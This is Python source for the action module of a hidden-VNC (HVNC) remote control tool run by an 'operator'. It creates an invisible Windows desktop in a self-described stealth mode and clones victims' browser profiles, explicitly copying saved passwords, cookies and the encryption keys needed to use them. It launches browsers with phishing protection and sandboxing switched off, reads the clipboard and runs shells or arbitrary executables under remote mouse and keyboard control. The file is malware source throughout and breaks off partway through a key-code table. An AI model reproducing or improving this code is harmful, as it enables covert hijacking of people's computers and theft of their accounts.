"""HVNC Actions Module.

Handles all HVNC-related actions from the operator:
- Starting/stopping hidden desktop
- Launching applications with profile cloning
- Clipboard operations
- Process management
"""
from __future__ import annotations

import ctypes
import logging
import os
import platform
import shutil
import subprocess
import threading
from typing import Any, Callable

logger = logging.getLogger(__name__)

# Only available on Windows
if platform.system() == "Windows":
    from ctypes import wintypes
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    
    # Clipboard formats
    CF_TEXT = 1
    CF_UNICODETEXT = 13
    
    # OpenClipboard
    user32.OpenClipboard.argtypes = [wintypes.HWND]
    user32.OpenClipboard.restype = wintypes.BOOL
    user32.CloseClipboard.argtypes = []
    user32.CloseClipboard.restype = wintypes.BOOL
    user32.EmptyClipboard.argtypes = []
    user32.EmptyClipboard.restype = wintypes.BOOL
    user32.GetClipboardData.argtypes = [wintypes.UINT]
    user32.GetClipboardData.restype = wintypes.HANDLE
    user32.SetClipboardData.argtypes = [wintypes.UINT, wintypes.HANDLE]
    user32.SetClipboardData.restype = wintypes.HANDLE
    
    kernel32.GlobalLock.argtypes = [wintypes.HGLOBAL]
    kernel32.GlobalLock.restype = wintypes.LPVOID
    kernel32.GlobalUnlock.argtypes = [wintypes.HGLOBAL]
    kernel32.GlobalUnlock.restype = wintypes.BOOL
    kernel32.GlobalAlloc.argtypes = [wintypes.UINT, ctypes.c_size_t]
    kernel32.GlobalAlloc.restype = wintypes.HGLOBAL
    kernel32.GlobalSize.argtypes = [wintypes.HGLOBAL]
    kernel32.GlobalSize.restype = ctypes.c_size_t
    
    GMEM_MOVEABLE = 0x0002

# Browser profile paths and launch configurations
# Extended args for HVNC isolation - prevents connecting to existing browser process
# Critical flags:
# - --user-data-dir: Forces separate profile (prevents sharing with main desktop browser)
# - --no-sandbox: Required for hidden desktop process creation
# - --disable-gpu: Avoids GPU context issues on hidden desktop
# - --disable-background-mode: Prevents background processes on main desktop
# - --disable-features=RendererCodeIntegrity: Required for Win11 24H2
# - --new-window: Forces new window instead of tab in existing browser
# Critical flags for HVNC browser isolation on Windows 11 24H2:
# - --disable-gpu-sandbox: Prevents GPU process from spawning on different desktop
# - --in-process-gpu: Run GPU in main process to inherit desktop
# - --single-process: (EXPERIMENTAL) All renderers in one process
# - --disable-features=RendererCodeIntegrity: Required for Win11 24H2
# - --disable-site-isolation-trials: Reduces process spawning

BROWSER_PROFILES = {
    "chrome": {
        "paths": [
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
        ],
        "exe": [
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        ],
        "args": [
            "--user-data-dir={profile_dir}",
            "--no-first-run",
            "--no-default-browser-check",
            "--disable-sync",
            "--disable-background-networking",
            "--disable-client-side-phishing-detection",
            "--disable-component-update",
            "--no-sandbox",
            "--disable-gpu",
            "--disable-gpu-sandbox",  # Critical: GPU process inherits desktop
            "--in-process-gpu",  # GPU runs in main process
            "--disable-software-rasterizer",
            "--disable-background-mode",
            "--disable-backgrounding-occluded-windows",
            "--disable-renderer-backgrounding",
            "--disable-features=RendererCodeIntegrity,BackgroundFetch,TranslateUI,IsolateOrigins,site-per-process",
            "--disable-site-isolation-trials",  # Reduces process spawning
            "--disable-hang-monitor",
            "--disable-ipc-flooding-protection",
            "--disable-popup-blocking",
            "--disable-prompt-on-repost",
            "--disable-domain-reliability",
            "--renderer-process-limit=1",  # Limit renderer processes
            "--new-window",
            "--start-maximized",
            "--window-position=0,0",
            "--force-device-scale-factor=1",
        ],
    },
    "firefox": {
        "paths": [
            os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles"),
        ],
        "exe": [
            r"C:\Program Files\Mozilla Firefox\firefox.exe",
            r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe",
        ],
        "args": [
            "-profile", "{profile_dir}",
            "-no-remote",  # Critical: don't connect to existing Firefox
            "-new-instance",  # Force new instance
            "-width", "1920",
            "-height", "1080",
        ],
    },
    "edge": {
        "paths": [
            os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
        ],
        "exe": [
            r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
            r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
        ],
        "args": [
            "--user-data-dir={profile_dir}",
            "--no-first-run",
            "--no-default-browser-check",
            "--disable-sync",
            "--disable-background-networking",
            "--disable-client-side-phishing-detection",
            "--disable-component-update",
            "--no-sandbox",
            "--disable-gpu",
            "--disable-gpu-sandbox",  # Critical: GPU process inherits desktop
            "--in-process-gpu",  # GPU runs in main process
            "--disable-software-rasterizer",
            "--disable-background-mode",
            "--disable-backgrounding-occluded-windows",
            "--disable-renderer-backgrounding",
            "--disable-features=msSmartScreenProtection,RendererCodeIntegrity,BackgroundFetch,EdgeCollections,msEdgeCollections,IsolateOrigins,site-per-process",
            "--disable-site-isolation-trials",  # Reduces process spawning
            "--disable-hang-monitor",
            "--disable-ipc-flooding-protection",
            "--disable-popup-blocking",
            "--disable-prompt-on-repost",
            "--disable-domain-reliability",
            "--renderer-process-limit=1",  # Limit renderer processes
            "--inprivate",  # InPrivate mode - extra isolation
            "--new-window",
            "--start-maximized",
            "--window-position=0,0",
            "--force-device-scale-factor=1",
            "--disable-edge-collections",
            "--disable-reading-list",
        ],
    },
    "opera": {
        "paths": [
            os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable"),
        ],
        "exe": [
            r"C:\Program Files\Opera\opera.exe",
            r"C:\Program Files (x86)\Opera\opera.exe",
            os.path.expandvars(r"%LOCALAPPDATA%\Programs\Opera\opera.exe"),
        ],
        "args": [
            "--user-data-dir={profile_dir}",
            "--no-first-run",
            "--disable-sync",
            "--disable-background-networking",
            "--no-sandbox",
            "--disable-gpu",
            "--disable-gpu-sandbox",
            "--in-process-gpu",
            "--disable-software-rasterizer",
            "--disable-background-mode",
            "--disable-features=RendererCodeIntegrity,IsolateOrigins,site-per-process",
            "--disable-site-isolation-trials",
            "--renderer-process-limit=1",
            "--new-window",
            "--start-maximized",
        ],
    },
    "brave": {
        "paths": [
            os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),
        ],
        "exe": [
            r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
            r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
        ],
        "args": [
            "--user-data-dir={profile_dir}",
            "--no-first-run",
            "--no-default-browser-check",
            "--disable-sync",
            "--disable-background-networking",
            "--no-sandbox",
            "--disable-gpu",
            "--disable-gpu-sandbox",
            "--in-process-gpu",
            "--disable-software-rasterizer",
            "--disable-background-mode",
            "--disable-features=RendererCodeIntegrity,IsolateOrigins,site-per-process",
            "--disable-site-isolation-trials",
            "--renderer-process-limit=1",
            "--new-window",
            "--start-maximized",
        ],
    },
}


class HVNCActions:
    """Handles HVNC actions from the operator."""
    
    def __init__(self, hvnc_session=None):
        """Initialize HVNC actions handler.
        
        Args:
            hvnc_session: The HVNCSession instance (from hvnc.py or hvnc_track.py)
        """
        self._session = hvnc_session
        self._active = False
        self._desktop_name = None
        self._processes: list[subprocess.Popen] = []
        self._temp_profiles: list[str] = []
        self._lock = threading.Lock()
    
    def set_session(self, session) -> None:
        """Set or update the HVNC session."""
        self._session = session
        if session:
            self._active = True
            self._desktop_name = getattr(session, '_desktop', None)
            if self._desktop_name and hasattr(self._desktop_name, 'name'):
                self._desktop_name = self._desktop_name.name
    
    @property
    def is_active(self) -> bool:
        return self._active and self._session is not None
    
    def start(self) -> dict:
        """Start HVNC session - create hidden desktop.
        
        Note: If DualStreamSession is used, the session is already created
        and set via set_session(). In that case, we just start the shell
        on the existing session instead of creating a new one.
        """
        if self._active and self._session is not None:
            # Session already exists (likely from DualStreamSession)
            # Just ensure shell is running if needed
            desktop_name = self._desktop_name
            if not desktop_name and hasattr(self._session, 'desktop'):
                desktop = getattr(self._session, 'desktop', None)
                if desktop and hasattr(desktop, 'name'):
                    desktop_name = desktop.name
            
            logger.info("HVNC already active via existing session: %s", desktop_name)
            return {
                "action": "hvnc_start",
                "success": True,
                "desktop_name": desktop_name,
                "message": "HVNC already active (via DualStreamSession)"
            }
        
        try:
            from .hvnc import create_hvnc_session
            # Create session WITHOUT shell for stealth mode
            # Shell (explorer.exe) would be visible indicator to user
            self._session = create_hvnc_session(
                width=1920,
                height=1080,
                fps=30,
                start_shell=False,  # STEALTH MODE - no explorer
            )
            self._active = True
            self._desktop_name = self._session.desktop.name
            
            logger.info("HVNC started (stealth mode, no shell): %s", self._desktop_name)
            return {
                "action": "hvnc_start",
                "success": True,
                "desktop_name": self._desktop_name,
                "stealth": True
            }
        except Exception as exc:
            logger.error("Failed to start HVNC: %s", exc)
            return {
                "action": "hvnc_start",
                "success": False,
                "error": str(exc)
            }
    
    def stop(self) -> dict:
        """Stop HVNC session - close hidden desktop."""
        if not self._active:
            return {
                "action": "hvnc_stop",
                "success": True,
                "message": "HVNC not active"
            }
        
        try:
            # Kill all tracked processes
            for proc in self._processes:
                try:
                    proc.terminate()
                except Exception:
                    pass
            self._processes.clear()
            
            # Clean up temp profiles
            for path in self._temp_profiles:
                try:
                    shutil.rmtree(path, ignore_errors=True)
                except Exception:
                    pass
            self._temp_profiles.clear()
            
            # Close session
            if self._session:
                self._session.close()
                self._session = None
            
            self._active = False
            self._desktop_name = None
            
            logger.info("HVNC stopped")
            return {
                "action": "hvnc_stop",
                "success": True
            }
        except Exception as exc:
            logger.error("Failed to stop HVNC: %s", exc)
            return {
                "action": "hvnc_stop",
                "success": False,
                "error": str(exc)
            }
    
    def get_status(self) -> dict:
        """Get HVNC status."""
        return {
            "action": "hvnc_status",
            "active": self._active,
            "desktop_name": self._desktop_name,
            "process_count": len(self._processes)
        }
    
    def start_shell(self) -> dict:
        """Start explorer.exe shell on HVNC desktop.
        
        By default HVNC runs in stealth mode without shell.
        Call this to explicitly start explorer (taskbar, start menu, etc.)
        """
        if not self.is_active:
            return {
                "action": "hvnc_start_shell",
                "success": False,
                "error": "HVNC not active"
            }
        
        try:
            result = self._session.start_shell()
            if result:
                logger.info("Started shell on HVNC desktop")
                return {
                    "action": "hvnc_start_shell",
                    "success": True,
                    "message": "Shell started"
                }
            else:
                return {
                    "action": "hvnc_start_shell",
                    "success": False,
                    "error": "Shell start failed"
                }
        except Exception as exc:
            logger.error("Failed to start shell: %s", exc)
            return {
                "action": "hvnc_start_shell",
                "success": False,
                "error": str(exc)
            }
    
    def _clone_profile_chromium(self, original_profile: str, temp_dir: str) -> None:
        """Clone Chromium-based browser profile (Chrome, Edge, Brave, Opera).
        
        Copies only essential files for fast, non-blocking operation.
        """
        src_default = os.path.join(original_profile, "Default")
        if os.path.exists(src_default):
            dst_default = os.path.join(temp_dir, "Default")
            os.makedirs(dst_default, exist_ok=True)
            
            # Essential files for passwords, cookies, sessions
            essential_files = [
                "Login Data",           # Saved passwords
                "Login Data-journal",   # Password journal
                "Cookies",              # Session cookies
                "Cookies-journal",      # Cookie journal
                "Web Data",             # Autofill data
                "Web Data-journal",     # Autofill journal
                "Preferences",          # Browser preferences
                "Secure Preferences",   # Secure prefs
                "Bookmarks",            # Bookmarks
                "History",              # Browser history
                "Favicons",             # Site favicons
            ]
            
            # Copy essential files
            for fname in essential_files:
                src_file = os.path.join(src_default, fname)
                if os.path.exists(src_file):
                    try:
                        shutil.copy2(src_file, os.path.join(dst_default, fname))
                        logger.debug("Copied %s", fname)
                    except Exception as e:
                        logger.debug("Could not copy %s: %s", fname, e)
            
            # Copy Local Storage directory (site data)
            local_storage_src = os.path.join(src_default, "Local Storage")
            if os.path.exists(local_storage_src):
                try:
                    shutil.copytree(
                        local_storage_src,
                        os.path.join(dst_default, "Local Storage"),
                        ignore=shutil.ignore_patterns("*.log")
                    )
                    logger.debug("Copied Local Storage")
                except Exception as e:
                    logger.debug("Could not copy Local Storage: %s", e)
            
            # Copy IndexedDB directory (site databases)
            indexeddb_src = os.path.join(src_default, "IndexedDB")
            if os.path.exists(indexeddb_src):
                try:
                    shutil.copytree(
                        indexeddb_src,
                        os.path.join(dst_default, "IndexedDB"),
                        ignore=shutil.ignore_patterns("*.log")
                    )
                    logger.debug("Copied IndexedDB")
                except Exception as e:
                    logger.debug("Could not copy IndexedDB: %s", e)
            
            # Copy Session Storage (for tabs)
            session_storage_src = os.path.join(src_default, "Session Storage")
            if os.path.exists(session_storage_src):
                try:
                    shutil.copytree(
                        session_storage_src,
                        os.path.join(dst_default, "Session Storage"),
                        ignore=shutil.ignore_patterns("*.log")
                    )
                    logger.debug("Copied Session Storage")
                except Exception as e:
                    logger.debug("Could not copy Session Storage: %s", e)
            
            # Copy Extensions directory
            extensions_src = os.path.join(src_default, "Extensions")
            if os.path.exists(extensions_src):
                try:
                    shutil.copytree(
                        extensions_src,
                        os.path.join(dst_default, "Extensions"),
                    )
                    logger.debug("Copied Extensions")
                except Exception as e:
                    logger.debug("Could not copy Extensions: %s", e)
        
        # Copy Local State (encryption keys - CRITICAL for passwords)
        local_state = os.path.join(original_profile, "Local State")
        if os.path.exists(local_state):
            shutil.copy2(local_state, temp_dir)
            logger.debug("Copied Local State (encryption keys)")
    
    def _clone_profile_firefox(self, original_profile: str, temp_dir: str) -> None:
        """Clone Firefox profile."""
        firefox_essential_files = [
            "logins.json",          # Saved passwords
            "key4.db",              # Password encryption key
            "cert9.db",             # Certificates
            "cookies.sqlite",       # Cookies
            "places.sqlite",        # Bookmarks and history
            "prefs.js",             # Preferences
            "formhistory.sqlite",   # Form autofill
            "permissions.sqlite",   # Site permissions
            "content-prefs.sqlite", # Content preferences
            "webappsstore.sqlite",  # Local storage
        ]
        
        for item in firefox_essential_files:
            src = os.path.join(original_profile, item)
            if os.path.exists(src):
                try:
                    shutil.copy2(src, os.path.join(temp_dir, item))
                    logger.debug("Copied %s", item)
                except Exception as e:
                    logger.debug("Could not copy %s: %s", item, e)
        
        # Copy storage directory
        storage_src = os.path.join(original_profile, "storage")
        if os.path.exists(storage_src):
            try:
                shutil.copytree(
                    storage_src,
                    os.path.join(temp_dir, "storage"),
                    ignore=shutil.ignore_patterns("*.log", "cache*")
                )
            except Exception as e:
                logger.debug("Could not copy storage: %s", e)
    
    def _launch_browser_background(
        self,
        browser: str,
        exe_path: str,
        config: dict,
        clone_profile: bool,
        callback: Callable[[dict], None] | None = None,
    ) -> None:
        """Launch browser in background thread with profile cloning.
        
        This runs profile cloning and browser launch in a separate thread
        to avoid blocking the main thread and causing WebRTC ICE timeout.
        
        Args:
            browser: Browser name
            exe_path: Path to browser executable
            config: Browser config from BROWSER_PROFILES
            clone_profile: Whether to clone profile
            callback: Optional callback with result dict
        """
        result = {"action": "hvnc_launch_browser", "success": False}
        browser_lower = browser.lower()
        
        try:
            profile_dir = None
            if clone_profile:
                # Find original profile
                original_profile = None
                for path in config["paths"]:
                    if os.path.exists(path):
                        original_profile = path
                        break
                
                if original_profile:
                    import tempfile
                    temp_dir = tempfile.mkdtemp(prefix=f"hvnc_{browser_lower}_")
                    profile_dir = temp_dir
                    
                    logger.info("Cloning %s profile to %s (background thread)", browser, temp_dir)
                    
                    # Clone based on browser type
                    if browser_lower in ("chrome", "edge", "brave", "opera"):
                        self._clone_profile_chromium(original_profile, temp_dir)
                    else:
                        self._clone_profile_firefox(original_profile, temp_dir)
                    
                    with self._lock:
                        self._temp_profiles.append(temp_dir)
                    logger.info("Profile cloned to %s", temp_dir)
            
            # Build command args
            args = []
            for arg in config["args"]:
                if profile_dir:
                    args.append(arg.format(profile_dir=profile_dir))
                elif "{profile_dir}" not in arg:
                    args.append(arg)
            
            # Launch on hidden desktop
            logger.info("Launching %s on hidden desktop", browser)
            proc = self._session.launch_application(exe_path, args=args)
            
            if proc:
                with self._lock:
                    self._processes.append(proc)
                result = {
                    "action": "hvnc_launch_browser",
                    "success": True,
                    "app": browser,
                    "pid": proc.pid,
                    "cloned": clone_profile and profile_dir is not None
                }
                logger.info("Browser %s launched with PID %s", browser, proc.pid)
            else:
                result = {
                    "action": "hvnc_launch_browser",
                    "success": False,
                    "error": "Failed to launch process"
                }
                
        except Exception as exc:
            logger.error("Failed to launch browser %s: %s", browser, exc)
            result = {
                "action": "hvnc_launch_browser",
                "success": False,
                "error": str(exc)
            }
        
        if callback:
            try:
                callback(result)
            except Exception as e:
                logger.warning("Callback failed: %s", e)
    
    def launch_browser(self, browser: str, clone_profile: bool = True, async_launch: bool = True) -> dict:
        """Launch browser on hidden desktop with optional profile cloning.
        
        Args:
            browser: Browser name (chrome, firefox, edge, opera, brave)
            clone_profile: Whether to clone the user's browser profile
            async_launch: If True, clone profile and launch in background thread
                         (non-blocking, prevents WebRTC ICE timeout)
            
        Profile cloning copies ONLY essential files for fast, non-blocking operation:
        - Login Data: saved passwords
        - Cookies: session cookies
        - Local State: encryption keys
        - Web Data: autofill data
        - Local Storage: site data
        - IndexedDB: site databases
        
        Large files like cache are EXCLUDED to keep cloning fast.
        
        Note: When async_launch=True, this returns immediately with status "launching"
        and the actual browser launch happens in background thread.
        """
        if not self.is_active:
            return {
                "action": "hvnc_launch_browser",
                "success": False,
                "error": "HVNC not active"
            }
        
        browser_lower = browser.lower()
        if browser_lower not in BROWSER_PROFILES:
            return {
                "action": "hvnc_launch_browser",
                "success": False,
                "error": f"Unknown browser: {browser}"
            }
        
        config = BROWSER_PROFILES[browser_lower]
        
        # Find executable
        exe_path = None
        for path in config["exe"]:
            if os.path.exists(path):
                exe_path = path
                break
        
        if not exe_path:
            return {
                "action": "hvnc_launch_browser",
                "success": False,
                "error": f"{browser} not installed"
            }
        
        if async_launch:
            # Launch in background thread to avoid blocking WebRTC
            thread = threading.Thread(
                target=self._launch_browser_background,
                args=(browser, exe_path, config, clone_profile),
                daemon=True,
            )
            thread.start()
            
            logger.info("Browser %s launch initiated (async)", browser)
            return {
                "action": "hvnc_launch_browser",
                "success": True,
                "status": "launching",
                "app": browser,
                "message": "Browser launch started in background"
            }
        
        # Synchronous launch (for backwards compatibility)
        try:
            profile_dir = None
            if clone_profile:
                original_profile = None
                for path in config["paths"]:
                    if os.path.exists(path):
                        original_profile = path
                        break
                
                if original_profile:
                    import tempfile
                    temp_dir = tempfile.mkdtemp(prefix=f"hvnc_{browser_lower}_")
                    profile_dir = temp_dir
                    
                    logger.info("Cloning %s profile to %s", browser, temp_dir)
                    
                    if browser_lower in ("chrome", "edge", "brave", "opera"):
                        self._clone_profile_chromium(original_profile, temp_dir)
                    else:
                        self._clone_profile_firefox(original_profile, temp_dir)
                    
                    self._temp_profiles.append(temp_dir)
                    logger.info("Profile cloned to %s", temp_dir)
            
            # Build command
            args = []
            for arg in config["args"]:
                if profile_dir:
                    args.append(arg.format(profile_dir=profile_dir))
                elif "{profile_dir}" not in arg:
                    args.append(arg)
            
            # Launch on hidden desktop
            proc = self._session.launch_application(exe_path, args=args)
            
            if proc:
                self._processes.append(proc)
                return {
                    "action": "hvnc_launch_browser",
                    "success": True,
                    "app": browser,
                    "pid": proc.pid,
                    "cloned": clone_profile and profile_dir is not None
                }
            else:
                return {
                    "action": "hvnc_launch_browser",
                    "success": False,
                    "error": "Failed to launch process"
                }
                
        except Exception as exc:
            logger.error("Failed to launch browser %s: %s", browser, exc)
            return {
                "action": "hvnc_launch_browser",
                "success": False,
                "error": str(exc)
            }
    
    def launch_cmd(self) -> dict:
        """Launch Command Prompt on hidden desktop."""
        if not self.is_active:
            return {"action": "hvnc_launch_cmd", "success": False, "error": "HVNC not active"}
        
        try:
            proc = self._session.launch_application("cmd.exe")
            if proc:
                self._processes.append(proc)
                return {"action": "hvnc_launch_cmd", "success": True, "pid": proc.pid}
            return {"action": "hvnc_launch_cmd", "success": False, "error": "Failed to launch"}
        except Exception as exc:
            return {"action": "hvnc_launch_cmd", "success": False, "error": str(exc)}
    
    def launch_powershell(self) -> dict:
        """Launch PowerShell on hidden desktop."""
        if not self.is_active:
            return {"action": "hvnc_launch_powershell", "success": False, "error": "HVNC not active"}
        
        try:
            # Try pwsh (PowerShell Core) first, then powershell.exe
            exe = "pwsh.exe" if shutil.which("pwsh") else "powershell.exe"
            proc = self._session.launch_application(exe)
            if proc:
                self._processes.append(proc)
                return {"action": "hvnc_launch_powershell", "success": True, "pid": proc.pid}
            return {"action": "hvnc_launch_powershell", "success": False, "error": "Failed to launch"}
        except Exception as exc:
            return {"action": "hvnc_launch_powershell", "success": False, "error": str(exc)}
    
    def launch_explorer(self) -> dict:
        """Launch File Explorer on hidden desktop."""
        if not self.is_active:
            return {"action": "hvnc_launch_explorer", "success": False, "error": "HVNC not active"}
        
        try:
            proc = self._session.launch_application("explorer.exe")
            if proc:
                self._processes.append(proc)
                return {"action": "hvnc_launch_explorer", "success": True, "pid": proc.pid}
            return {"action": "hvnc_launch_explorer", "success": False, "error": "Failed to launch"}
        except Exception as exc:
            return {"action": "hvnc_launch_explorer", "success": False, "error": str(exc)}
    
    def run_exe(self, path: str, args: str = "") -> dict:
        """Run custom executable on hidden desktop."""
        if not self.is_active:
            return {"action": "hvnc_run_exe", "success": False, "error": "HVNC not active"}
        
        if not path:
            return {"action": "hvnc_run_exe", "success": False, "error": "Path required"}
        
        try:
            arg_list = args.split() if args else None
            proc = self._session.launch_application(path, args=arg_list)
            if proc:
                self._processes.append(proc)
                return {"action": "hvnc_run_exe", "success": True, "path": path, "pid": proc.pid}
            return {"action": "hvnc_run_exe", "success": False, "error": "Failed to launch"}
        except Exception as exc:
            return {"action": "hvnc_run_exe", "success": False, "error": str(exc)}
    
    def start_process(self, path: str, args: str = "") -> dict:
        """Start a process on hidden desktop."""
        return self.run_exe(path, args)
    
    def get_clipboard(self) -> dict:
        """Get clipboard text from hidden desktop."""
        if platform.system() != "Windows":
            return {"action": "hvnc_get_clipboard", "success": False, "error": "Windows only"}
        
        try:
            text = ""
            if user32.OpenClipboard(None):
                try:
                    handle = user32.GetClipboardData(CF_UNICODETEXT)
                    if handle:
                        data = kernel32.GlobalLock(handle)
                        if data:
                            text = ctypes.wstring_at(data)
                            kernel32.GlobalUnlock(handle)
                finally:
                    user32.CloseClipboard()
            
            return {
                "action": "hvnc_get_clipboard",
                "success": True,
                "text": text
            }
        except Exception as exc:
            return {"action": "hvnc_get_clipboard", "success": False, "error": str(exc)}
    
    def send_clipboard(self, text: str) -> dict:
        """Send text to clipboard on hidden desktop."""
        if platform.system() != "Windows":
            return {"action": "hvnc_send_clipboard", "success": False, "error": "Windows only"}
        
        if not text:
            return {"action": "hvnc_send_clipboard", "success": False, "error": "Text required"}
        
        try:
            # Encode text to UTF-16
            data = text.encode("utf-16-le") + b"\x00\x00"
            
            if user32.OpenClipboard(None):
                try:
                    user32.EmptyClipboard()
                    
                    # Allocate global memory
                    h_mem = kernel32.GlobalAlloc(GMEM_MOVEABLE, len(data))
                    if h_mem:
                        locked = kernel32.GlobalLock(h_mem)
                        if locked:
                            ctypes.memmove(locked, data, len(data))
                            kernel32.GlobalUnlock(h_mem)
                            user32.SetClipboardData(CF_UNICODETEXT, h_mem)
                finally:
                    user32.CloseClipboard()
            
            return {"action": "hvnc_send_clipboard", "success": True}
        except Exception as exc:
            return {"action": "hvnc_send_clipboard", "success": False, "error": str(exc)}
    
    def kill_process(self, pid: int = None, name: str = None) -> dict:
        """Kill a process on hidden desktop."""
        if not pid and not name:
            return {"action": "hvnc_kill_process", "success": False, "error": "PID or name required"}
        
        try:
            if pid:
                # Kill by PID
                os.kill(pid, 9)
                # Remove from tracked processes
                self._processes = [p for p in self._processes if p.pid != pid]
                return {"action": "hvnc_kill_process", "success": True, "pid": pid}
            else:
                # Kill by name
                killed = 0
                for proc in list(self._processes):
                    try:
                        if name.lower() in proc.args[0].lower():
                            proc.terminate()
                            self._processes.remove(proc)
                            killed += 1
                    except Exception:
                        pass
                
                # Also try taskkill
                try:
                    subprocess.run(["taskkill", "/F", "/IM", name], 
                                 capture_output=True, timeout=5)
                except Exception:
                    pass
                
                return {"action": "hvnc_kill_process", "success": True, "name": name, "killed": killed}
                
        except Exception as exc:
            return {"action": "hvnc_kill_process", "success": False, "error": str(exc)}
    
    def list_processes(self) -> dict:
        """List processes running on hidden desktop."""
        processes = []
        for proc in self._processes:
            try:
                if proc.poll() is None:  # Still running
                    name = os.path.basename(proc.args[0]) if proc.args else "unknown"
                    processes.append({"pid": proc.pid, "name": name})
            except Exception:
                pass
        
        return {
            "action": "hvnc_list_processes",
            "success": True,
            "processes": processes
        }
    
    def get_frame(self, quality: int = 50, scale: float = 0.5) -> dict:
        """Get a frame from the hidden desktop as base64 JPEG.
        
        Args:
            quality: JPEG quality (1-100)
            scale: Scale factor for the image (0.1-1.0)
            
        Returns:
            Response dict with base64 encoded JPEG frame
        """
        if not self.is_active:
            return {"action": "hvnc_get_frame", "success": False, "error": "HVNC not active"}
        
        try:
            import base64
            import io
            
            # Get raw frame from session
            frame_data, size = self._session.get_frame(timeout=0.5)
            
            if not frame_data or not size:
                return {"action": "hvnc_get_frame", "success": False, "error": "No frame available"}
            
            width, height = size
            
            # Convert BGRA to RGB and create image
            try:
                from PIL import Image
                
                # Frame data is BGRA
                img = Image.frombytes("RGBA", (width, height), frame_data, "raw", "BGRA")
                img = img.convert("RGB")
                
                # Scale if needed
                if scale < 1.0:
                    new_width = int(width * scale)
                    new_height = int(height * scale)
                    img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)
                
                # Save as JPEG to buffer
                buffer = io.BytesIO()
                img.save(buffer, format="JPEG", quality=quality)
                jpeg_data = buffer.getvalue()
                
                # Encode to base64
                b64_frame = base64.b64encode(jpeg_data).decode("ascii")
                
                return {
                    "action": "hvnc_get_frame",
                    "success": True,
                    "frame": b64_frame,
                    "width": img.width,
                    "height": img.height,
                }
            except ImportError:
                # PIL not available, return error
                return {"action": "hvnc_get_frame", "success": False, "error": "PIL not installed"}
                
        except Exception as exc:
            logger.error("Failed to get HVNC frame: %s", exc)
            return {"action": "hvnc_get_frame", "success": False, "error": str(exc)}
    
    def handle_control(self, payload: dict) -> bool:
        """Handle mouse/keyboard control command for HVNC desktop.
        
        Args:
            payload: Control payload with type and coordinates
            
        Returns:
            True if handled successfully, False if HVNC not active
        """
        if not self.is_active or not self._session:
            return False
        
        msg_type = payload.get("type")
        if not msg_type:
            return False
        
        try:
            x = int(payload.get("x", 0))
            y = int(payload.get("y", 0))
            
            if msg_type == "mouse_move":
                self._session.mouse_move(x, y)
            elif msg_type == "mouse_down":
                button = payload.get("button", "left")
                self._session.mouse_down(x, y, button)
            elif msg_type == "mouse_up":
                button = payload.get("button", "left")
                self._session.mouse_up(x, y, button)
            elif msg_type == "mouse_click":
                button = payload.get("button", "left")
                self._session.mouse_click(x, y, button)
            elif msg_type == "mouse_scroll":
                delta_x = int(payload.get("delta_x", 0))
                delta_y = int(payload.get("delta_y", 0))
                self._session.mouse_scroll(x, y, delta_x, delta_y)
            elif msg_type == "key_down":
                key = payload.get("key", "")
                if key:
                    vk_code = self._key_to_vk(key)
                    if vk_code:
                        self._session.key_down(vk_code)
                    else:
                        # If not a special key, type as text
                        if len(key) == 1:
                            self._session.type_text(key)
            elif msg_type == "key_up":
                key = payload.get("key", "")
                if key:
                    vk_code = self._key_to_vk(key)
                    if vk_code:
                        self._session.key_up(vk_code)
            elif msg_type == "keypress":
                key = payload.get("key", "")
                if key:
                    vk_code = self._key_to_vk(key)
                    if vk_code:
                        self._session.key_down(vk_code)
                        self._session.key_up(vk_code)
                    elif len(key) == 1:
                        self._session.type_text(key)
            elif msg_type in ("text", "text_input"):
                text = payload.get("text", "")
                if text:
                    self._session.type_text(text)
            else:
                logger.debug("Unknown HVNC control type: %s", msg_type)
                return False
            
            return True
        except Exception as exc:
            logger.warning("HVNC control error: %s", exc)
            return False
    
    def _key_to_vk(self, key: str) -> int | None:
        """Convert key code string to Windows virtual key code.
        
        Args:
            key: Key code string (e.g., "KeyA", "Enter", "Backspace")
            
        Returns:
            Virtual key code or None if not a special key
        """
        # Key code to VK mapping
        key_map = {
            # Letters
            "KeyA": 0x41, "KeyB": 0x42, "KeyC": 0x43, "KeyD": 0x44,
            "KeyE": 0x45, "KeyF": 0x46, "KeyG": 0x47, "KeyH": 0x48,
            "KeyI": 0x49, "KeyJ": 0x4A, "KeyK": 0x4B, "KeyL": 0x4C,
            "KeyM": 0x4D, "KeyN": 0x4E, "KeyO": 0x4F, "KeyP": 0x50,
            "KeyQ": 0x51, "KeyR": 0x52, "KeyS": 0x53, "KeyT": 0x54,
            "KeyU": 0x55, "KeyV": 0x56, "KeyW": 0x57, "KeyX": 0x58,
            "KeyY": 0x59, "KeyZ": 0x5A,
            # Numbers
            "Digit0": 0x30, "Digit1": 0x31, "Digit2": 0x32, "Digit3": 0x33,
            "Digit4": 0x34, "Digit5": 0x35, "Digit6": 0x36, "Digit7": 0x37,
            "Digit8": 0x38, "Digit9": 0x39,
            # Function keys
            "F1": 0x70, "F2": 0x71, "F3": 0x72, "F4": 0x73,
            "F5": 0x74, "F6": 0x75, "F7": 0x76, "F8": 0x77,
            "F9": 0x78, "F10": 0x79, "F11": 0x7A, "F12": 0x7B,
            # Control keys
            "Enter": 0x0D, "Return": 0x0D,
            "Tab": 0x09,
            "Space": 0x20,
            "Backspace": 0x08,
            "Delete": 0x2E,
            "Insert": 0x2D,
            "Home": 0x24,
            "End": 0x23,
            "PageUp": 0x21,
            "PageDown": 0x22,
            "Escape": 0x1B,
            # Arrow keys
            "ArrowUp": 0x26, "ArrowDown": 0x28,
            "ArrowLeft": 0x25, "ArrowRight": 0x27,
            # Modifiers
            "ShiftLeft": 0xA0, "ShiftRight": 0xA1,
            "ControlLeft": 0xA2, "ControlRight": 0xA3,
